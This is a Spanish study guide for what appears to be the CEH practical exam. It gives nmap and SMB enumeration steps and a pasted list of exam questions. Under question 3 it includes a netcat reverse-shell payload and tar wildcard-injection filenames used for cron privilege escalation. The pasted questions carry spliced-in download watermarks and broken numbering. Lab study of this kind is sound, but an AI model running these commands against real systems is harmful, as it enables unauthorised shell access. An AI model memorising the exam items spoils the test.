El siguiente es el procedimiento de un examen en linea que se puede encontrar, continuación se mostará parte del procedimiento así como algunas maquinas relacionadas con los aprendizajes, esta versión contiene algunos comandos extra que pueden dar errores

Estandar de cada pregunta 
**Objetivo:**
**Contexto:**
**Procedimiento:**
**Herramienta(s):**
**Comandos:**
**Sala recomendadas:**

### 1.- Perform extensive scan of the target network and identify the FQDN of the Domain Controller.
**Objetivo:** Obtener el FQDN del controlador de dominio  
**Contexto:** El FQDN (Fully Qualified Domain Name) es el nombre completo de un dispositivo en la red que especifica su ubicación exacta dentro del árbol del sistema de nombres de dominio (DNS), El FQDN se compone de tres partes principales:

1. Nombre del Host: El nombre específico del dispositivo dentro de su red local. Por ejemplo, "server1".
2. Dominio: La estructura jerárquica que identifica la red dentro de Internet. Puede tener varios niveles, como "subdominio.midominio.com".
3. TLD (Top-Level Domain): La parte final del dominio, que puede ser ".com", ".org", ".net", etc.

Diferencia entre dominio y FQDN
- Dominio: "example.com"
- FQDN: "server1.example.com"

**Nota Personal:** Considero que falta contexto ya que no se menciona el dominio, ni tampoco se menciona que tan amplia es la red
 
**Procedimiento:** Se puede realizar de varias maneras:
1. Escanear la red en busca de los hosts encendidos
```
### Para escanear la red e identificar los hosts encedidos / activos
sudo nmap -sn 10.200.56.1-255
### El comando anterior te dará la lista de los hosts activos, y se basa en la sala de tryhackem mencionada abajo
```
2. Identificar los puertos relacionados al AD / DC como lo son :  88,135,139,389,445

```
### Ahora hay que escnear los hosts activos para identificar sus servicios
sudo nmap -p 88,135,139,389,445,636,3268,3269 -sV 192.168.1.##, 192.168.1.##
### El comando anterior escaneara cuales son los hosts que tiene activos los servicios especificados, el que cuente con los servicios especificados es probable que sea el Domain Controller
```

| Puerto | Protocolo | Servicio                              | Descripción                                                                               |
|--------|-----------|---------------------------------------|-------------------------------------------------------------------------------------------|
| 88     | TCP/UDP   | Kerberos                              | Protocolo de autenticación de red                                                         |
| 135    | TCP/UDP   | Microsoft RPC                         | Comunicación entre procesos en sistemas distribuidos                                      |
| 139    | TCP       | NetBIOS Session Service               | Compartir archivos e impresoras en redes Windows                                          |
| 389    | TCP/UDP   | LDAP                                  | Protocolo para servicios de directorio distribuidos                                       |
| 445    | TCP       | Microsoft-DS (SMB)                    | Servicios de directorio, compartir archivos e impresoras                                  |
| 636    | TCP       | LDAPS                                 | LDAP sobre SSL/TLS, versión segura de LDAP                                                |
| 3268   | TCP       | Global Catalog (GC)                   | Consultas al catálogo global en Active Directory                                          |
| 3269   | TCP       | Global Catalog over SSL (GC over SSL) | Consultas al catálogo global en Active Directory con comunicación cifrada SSL/TLS         |

3. Una vez identificados los host que cuentan con los servicios, se puede utilizar ldapsearch para enumerar a través de la IP

```
### ldapsearch va enumerar la IP  dentro de la enumeración podemos ver el dominio y el fqdn
ldapsearch -x -H ldap://<IP_del_servidor> -b ""
```

#### Recomendación personal
Haciendo el procedimiento en tryhackem en la sala de enumeración de active directory note que los comandos anteiores no funcionaron, de hecho la forma más facil de obtener la información es la siguiente:

```
sudo nmap -sn 10.200.56.1-255        #Escaneo de la red para identificar host
sudo nmap -A IPdeDC                  #Probar el escaneo agresivo en los host, aqui se va listar

En el caso de tryhackme el puerto 3389/tcp muestra el  FQDN 

3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=THMDC.za.tryhackme.com
| Not valid before: 2024-05-27T13:53:19
|_Not valid after:  2024-11-26T13:53:19
|_ssl-date: 2024-05-30T05:24:12+00:00; 0s from scanner time.

```

**Sala recomendadas:** 
+ https://tryhackme.com/r/room/adenumeration

### 2. While investigating an attack, you found that a Windows web development environment was exploited to gain access to the system. Perform extensive scanning and service enumeration of the target networks and identify the IP address of the server running WampServer  
**Objetivo:** Obtener la Ip del host que ejecuta WampServer  
**Contexto:** Investigando un poco nos podemos dar cuenta que WampServer es un servidor web por lo que es probable que utilice puertos como el 80, 443, 8080  
**Procedimiento:** 
1. Identificar hosts activos (ya los tenemos de la primera tarea)
2. Escanear todos los puertos para identificar los servicios que tienen, así como sus versiones
```
1.- nmap -sn 192.168.1.0/24                            #Escanear red
2.- nmap -p- IpDelHost                                 #Escanear Puertos
3.- nmap -sV -p PuertoActivo,PuertoActivo IpDelHost    #Identificar servicios

Comando alternativo
nmap -p 80,443,8080 --script=http-title,http-server-header 192.168.1.1-254        #Este comando extrae todos los headers de un servicio web
```  
**Nota:**  Hasta este momento no se comento que se explote este servidor, solo se dice que es vulnerable

### 3. Identify a machine with SMB service enabled in the 192.168.0.0/24 subnet. Crack the SMB credentials for user Henry and obtain Sniff.txt file containing an encoded secret. Decrypt the encoded secret and enter the decrypted text as the answer. Note: Use Henry’s password to decodethe text.
**Objetivo:** Crackear las credenciales de Henry y obtener el archivo sniff.txt, descifrar el archivo que contiene la respuesta
**Contexto:**
**Procedimiento:**
1. Escanear la red en busca de los hosts encendidos
```
### Para escanear la red e identificar los hosts encedidos / activos
sudo nmap -sn 10.200.56.1-255
### El comando anterior te dará la lista de los hosts activos, y se basa en la sala de tryhackem mencionada abajo
```
2. Identificar los puertos relacionados al AD / DC como lo son :  88,135,139,389,445

```
### Ahora hay que escnear los hosts activos para identificar sus servicios
sudo nmap -p 445 -sV 192.168.1.##, 192.168.1.##
sudo nmap -A IpDelServidorConSMB ó utilizar -sC     #Ya que nos dará información como saber si permite ingresar con el usuario guest o anonymo
### El comando anterior escaneara cuales son los hosts que tiene activos los servicios especificados, el que cuente con los servicios especificados es probable que sea el Domain Controller
```
3. Enumerar la SMB
```
#Se hace con el siguiente comando
enumlinux IP

#Nos dará información valiosa como las rutas de la SMB, quizas algun usuario, con la información que nos arroje podemos utilizar otro tipo de ataques u objetner información valiosa

```
  
4. Acceder a la SMB
```
# Con el siguiente comando podemos ingresar a la SMB
smbclient //IP/Path                        #Con usuario guest
smbclient -U milesdyson //$ip/milesdyson   #Especificando algun usuario
```
5. Dependiento las rutas a las que se tienen acceso o la información que se pueda acceder a la SMB cambiará el procedimiento
```
A continuación un código que ayuda a hacer un reverse shell desde un cronjob 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.59.134 9999 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1" 

```
6. Descrifrar archivo
Depende con que herramienta fue cidrado el archivo, por lo que habra que identificar

**Links recomendados**
+ https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-smb
**Sala recomendadas:** 
+ https://tryhackme.com/r/room/skynet
+ https://tryhackme.com/r/room/nerdherd

### 5. An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain malicious elf files stored in a folder “Scan”. Perform deep scan on the elf files and obtain the last 4 digits of SHA384 hash of the file with highest entropy value.

6. Perform a vulnerability scan for the host with IP address 172.20.0.16
What is the severity score of a vulnerability the indicates the End of
Life of a web development language platform?
7. Exploit a remote login and command-line execution application on a
Linux target in the 192.168.0.0/24 subnet to access a sensitive file,
NetworkPass.txt Enter the content in the file as answer.
8. A forensic investigator has confiscated a computer from a suspect in a
data leakage case. He found an image file, MyTrip.jpg. stored in the
Documents folder of the “EH Workstation – 2” machine. He suspects
that some confidential data is hidden in the image file. Analyse the
This study source was downloaded by 100000879623482 from CourseHero.com on 01-23-2024 02:21:05 GMT -06:00
https://www.coursehero.com/file/210791184/CEH-PRACTICAL-EXAM-QUESTIONSdocx/image file and extract the sensitive data hidden in the file. Enter the
sensitive data, an eight-character alpha-numeric string, as the answer.
Use “Imagination” if you are stuck.
9. Exploit weak credentials used for FTP service on a Windows machine in
the 192.168.0.0/24 subnet. Obtain the file, Credentials.txt, hosted on the
FTP root, and Enter its content as the answer.
10. You used shoulder surfing to identify the usernames and password of a
user on the Ubuntu machine in the 192.168.0.0/24 network, that is,
smith and L1nux123. Access the Machine, Perform vertical privilege
escalation to that of a root user, and enter the content of the imroot.txt
file as the answer.
11. During as assignment, an incident responder has retained a suspicious executable
file “die-another-da” Your task as a malware analyst is to find the executable’s
Entry point (Address). The file is in the C:\Users\Admin\Documents directory in
the “EH Workstation – 2” machines.
12. You are investigating a massive DDoS attack launched against a target
at 10.10.1.10. Identify the attacking IP address that sent most packets to
the victim machine. The network capture file “attack-traffic.pcapng” is
saved in the Documents folder of the “EH Workstation – 1”
(ParrotSecurity) machine.
13. Perform the SQL injection attack on your target web application
cinema.cehorg.com and extract the password of a user Sarah. You have
already registered on the website with credentials Karen/computer.
14. Exploit the web application available at www.cehorg.com and enter
the flag’s value at the page with page_id=84.
This study source was downloaded by 100000879623482 from CourseHero.com on 01-23-2024 02:21:05 GMT -06:00
https://www.coursehero.com/file/210791184/CEH-PRACTICAL-EXAM-QUESTIONSdocx/14. Perform vulnerability research and exploit the web application
training.cehorg.com, available at 192.168.0.64. Locate the Flag.txt file
and enter its content as the answer.
15. Perform SQL injection attack on a web application
cybersec.cehorg.com, available at 172.20.0.22. Find the value in the Flag
column in one of the DB tables and enter it as the answer.
16. A file named Hast.txt has been uploaded through DVWA
(http://172.20.0.16:8080/DVWA). The file is located in the
“C:\wamp64\www\DVWA\hackable\uploads\” directory. Access the file
and crack the MD5 hash to reveal the original message. Enter the
decrypted message as the answer. You can log into the DVWA using the
credentials admin/passwd.
17. Analyse the traffic capture from an IoT network located in the
Documents folder of the “EH Workstation – 1” (ParrotSecurity)
machine, identify the packet with IoT Publish Message, and enter the
message length as the answer.
18. Your organization suspects the presence of a rogue AP in the vicinity.
You are tasked with cracking the wireless encryption, connecting to the
network and setting up a honeypot. The airdump-ng tool has been used,
and the Wi-Fi traffic capture named
“WirelessCapture.cap” is located in the Documents folder in the “EH
Workstation – 1” (ParrotSecurity) machine. Crack the wireless
encryption and identify the Wi-Fi password.
19. A disgruntled ex-employee has hidden a server access code in a
Windows machine in the 192.168.0.0/24 subnet. You can not physically
access the target machine. but you know that the organization
administration purpose. Your task is to retrieve the “sa_code.txt” file
from the target machine and enter the string in the file as the answer.20.
A disgruntled employee of your target organization has stolen the
company’s trade secrets and encrypted them using VeraCrypt. The
VeraCrypt volume file “Secret” is stored on the C: drive of the “EH
Workstation – 2” machine. The password to access the volume has
been hashed and saved in the file Key2Secret.txt located in the
Documents folder in the “EH Workstation – 1” (ParrotSecurity)
machine. As an ethical hacker working with the company. you need to
decrypt the hash in the with the company. you need to decrypt the hash
in the Key2Secret.txt file, access the VeraCrypt volume, and find the
secret code in the file named Confindential.txt.
Powered by TCPDF (www.tcpdf.org)
